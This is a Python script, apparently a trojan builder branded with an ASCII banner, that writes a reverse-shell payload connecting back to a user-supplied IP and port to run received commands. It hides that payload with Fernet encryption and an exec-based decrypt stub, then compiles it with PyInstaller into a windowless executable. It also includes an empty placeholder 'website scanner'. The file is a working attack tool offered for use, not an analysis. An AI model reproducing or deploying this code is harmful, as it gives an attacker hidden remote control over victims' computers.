import os
import socket
import subprocess
from cryptography.fernet import Fernet
import requests
from requests.exceptions import RequestException
from urllib.parse import urljoin, urlparse

# Códigos de escape ANSI para colores
RED = "\033[91m"
BLUE = "\033[94m"
RESET = "\033[0m"

# Banner
banner = f"""
{RED}
████████╗██████╗░░█████╗░██╗░░░██╗░█████╗░███╗░░██╗██████╗░░█████╗░██╗░░░██╗
╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗████╗░██║██╔══██╗██╔══██╗╚██╗░██╔╝
░░░██║░░░██████╔╝██║░░██║░╚████╔╝░███████║██╔██╗██║██████╔╝███████║░╚████╔╝░
░░░██║░░░██╔══██╗██║░░██║░░╚██╔╝░░██╔══██║██║╚████║██╔═══╝░██╔══██║░░╚██╔╝░░
░░░██║░░░██║░░██║╚█████╔╝░░░██║░░░██║░░██║██║░╚███║██║░░░░░██║░░██║░░░██║░░░
░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░
Created by Darck_sac{RESET}
"""

# Función para generar y devolver una clave de cifrado
def generate_key():
    return Fernet.generate_key()

# Función para cifrar el código Python del payload
def encrypt_payload(code, key):
    cipher = Fernet(key)
    encrypted_code = cipher.encrypt(code.encode())
    return encrypted_code

# Función para generar el payload cifrado
def create_reverse_shell(ip, port, key):
    payload = f"""
import socket
import subprocess
from cryptography.fernet import Fernet

def decrypt_and_execute(ciphertext, key):
    cipher = Fernet(key)
    decrypted_code = cipher.decrypt(ciphertext).decode()
    exec(decrypted_code)

if __name__ == "__main__":
    encrypted_code = b"{encrypt_payload(reverse_shell_code(ip, port), key).decode()}"
    decryption_key = b"{key.decode()}"
    decrypt_and_execute(encrypted_code, decryption_key)
"""

    return payload

# Código principal para la reverse shell
def reverse_shell_code(ip, port):
    return f"""
def connect_back(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    while True:
        command = s.recv(1024).decode("utf-8")
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(output.encode("utf-8"))

    s.close()

connect_back("{ip}", {port})
"""

# Función para escanear un sitio web en busca de vulnerabilidades comunes
def scan_website(url):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            print(f"[+] Successfully connected to {url}")
            # Aquí puedes agregar el código para el escaneo
        else:
            print(f"[-] Failed to connect to {url}, status code: {response.status_code}")
    except RequestException as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    # Limpiar la pantalla antes de mostrar el banner
    os.system("cls" if os.name == "nt" else "clear")
    print(banner)
    
    target_ip = input("Enter your IP address: ")
    target_port = int(input("Enter the port you want to use: "))
    
    # Generar clave de cifrado
    key = generate_key()
    
    # Crear el payload cifrado
    encrypted_payload = create_reverse_shell(target_ip, target_port, key)
    
    with open("payload.py", "w") as f:
        f.write(encrypted_payload)
    
    print("Payload created successfully as payload.py")

    # Compilar el payload a .exe usando PyInstaller
    print("Compiling payload to executable...")
    os.system(f"pyinstaller --onefile --noconsole payload.py")
    print("Executable created successfully!")

    # Escaneo de vulnerabilidades en el sitio web
    target_url = input("Enter the URL of the website to scan: ")
    print(f"Scanning website: {target_url}")
    scan_website(target_url)
